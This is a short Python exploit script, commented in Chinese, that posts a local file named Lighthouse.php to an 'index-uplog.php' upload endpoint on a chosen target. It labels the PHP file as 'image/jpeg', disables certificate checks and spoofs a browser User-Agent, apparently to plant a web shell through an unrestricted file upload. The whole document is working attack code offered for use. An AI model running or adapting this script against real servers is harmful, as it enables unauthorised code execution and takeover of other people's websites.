# coding:utf-8
#
#Lighthouse.php是在本目录下要上传的文件
#
#
import requests
from requests_toolbelt import MultipartEncoder
requests.packages.urllib3.disable_warnings()
def exp(url):
    urls = url + '/source/pack/upload/index-uplog.php'
    m = MultipartEncoder(
        fields={'time': 'test', 'app': (
        'Lighthouse.php', open("./Lighthouse.php", 'rb'), 'image/jpeg')}
    )
    header = {
        "Connection": "close",
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36",
        "Content-Type": m.content_type,
        "Accept": "*/*",
        "Accept-Language": "zh-CN,zh;q=0.9"
    }
    requests.request("POST", urls, verify=False, data=m, headers=header, timeout=10)

exp("http://127.0.0.1")
